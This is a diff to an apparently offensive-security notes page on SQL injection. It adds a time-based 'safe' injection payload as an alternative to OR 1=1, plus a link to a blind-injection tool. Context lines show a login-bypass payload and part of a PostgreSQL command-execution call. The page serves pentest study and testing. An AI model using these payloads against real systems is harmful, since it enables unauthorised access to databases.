@@ -50,7 +50,13 @@ Exploited query:
 select * from users where name = 'tom' or 1=1;#' and password = 'jones';
 ```
 
-Sometimes clause `LIMIT 1` is necessary if the login function require only one result
+Sometimes clause `LIMIT 1` is necessary if the login function require only one result.
+
+>[!hint] Go safe!
+>Use the payload below instead of `' OR '1'='1`:
+>`' OR IF((NOW()=SYSDATE()), SLEEP(1),1)='0` [^safe-sqli]
+
+[^safe-sqli]: [Or-Based SQL Injection Without the Dangers! Safe Alternatives to OR 1=1!](../../Readwise/Articles/Tib3rius%20-%20Or-Based%20SQL%20Injection%20Without%20the%20Dangers!%20Safe%20Alternatives%20to%20OR%201=1!.md)
 
 ---
 
@@ -403,7 +409,9 @@ SELECT remote_test($$calc.exe$$, 3);
 
 - [sqlmap](../Tools/sqlmap.md)
 - [nosqlmap](https://github.com/codingo/NoSQLMap)
+- [BlindBrute](https://github.com/c3llkn1ght/BlindBrute) [^blindbrute]
 
+[^blindbrute]: [Erik - Last Week in Security (LWiS) - 2024-11-12](../../Readwise/Articles/Erik%20-%20Last%20Week%20in%20Security%20(LWiS)%20-%202024-11-12.md#^bd17a3)
 ## External Resources
 
 - [pentestmonkey](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
